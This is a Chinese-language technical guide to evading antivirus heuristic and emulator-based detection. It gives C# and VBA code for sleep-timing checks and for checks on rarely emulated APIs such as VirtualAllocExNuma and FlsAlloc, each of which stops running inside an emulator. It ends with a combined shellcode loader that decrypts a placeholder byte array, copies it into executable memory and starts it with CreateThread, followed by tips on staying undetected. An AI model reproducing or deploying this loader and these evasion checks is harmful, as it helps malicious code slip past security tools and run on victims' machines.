# 启发式检测绕过技术

## 概述

启发式检测通过模拟执行来分析程序行为。绕过方法是让代码在模拟器中表现不同。

## Sleep 延迟检测

### 原理

模拟器会"快进"Sleep 调用，通过检测时间差可以判断是否在模拟器中运行。

### C# 实现

```csharp
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);

static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);  // 2 秒延迟
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

    if(t2 < 1.5)  // 如果时间差小于 1.5 秒，说明被快进了
    {
        return;  // 退出，不执行恶意代码
    }

    // 执行 shellcode...
}
```

### VBA 实现

```vba
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep(2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Sub
    End If

    ' 执行 shellcode...
End Sub
```

## 非模拟 API 检测

### 原理

某些不常用的 API 可能不被模拟器支持，调用失败说明在模拟器中。

### VirtualAllocExNuma

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

static void Main(string[] args)
{
    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,
        0x1000, 0x3000, 0x4, 0);

    if(mem == IntPtr.Zero)
    {
        return;  // API 未被模拟，退出
    }

    // 执行 shellcode...
}
```

### FlsAlloc

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern uint FlsAlloc(IntPtr callback);

static void Main(string[] args)
{
    uint result = FlsAlloc(IntPtr.Zero);

    if(result == 0xFFFFFFFF)
    {
        return;  // 在模拟器中
    }

    // 执行 shellcode...
}
```

## 组合使用

```csharp
static void Main(string[] args)
{
    // 1. 非模拟 API 检测
    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,
        0x1000, 0x3000, 0x4, 0);
    if(mem == IntPtr.Zero) return;

    // 2. Sleep 延迟检测
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    if(DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

    // 3. 解密 shellcode
    byte[] buf = new byte[] { 0xfe, 0x4a, 0x85 };  // 实际使用时替换为完整加密字节
    for(int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
    }

    // 4. 执行
    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
    Marshal.Copy(buf, 0, addr, buf.Length);
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
}
```

## 注意事项

1. **测试真实环境** - 确保绕过技术不影响正常执行
2. **组合多种技术** - 单一技术可能被检测
3. **定期更新** - 杀软会更新模拟器
4. **避免过度检测** - 太多检测可能导致误判
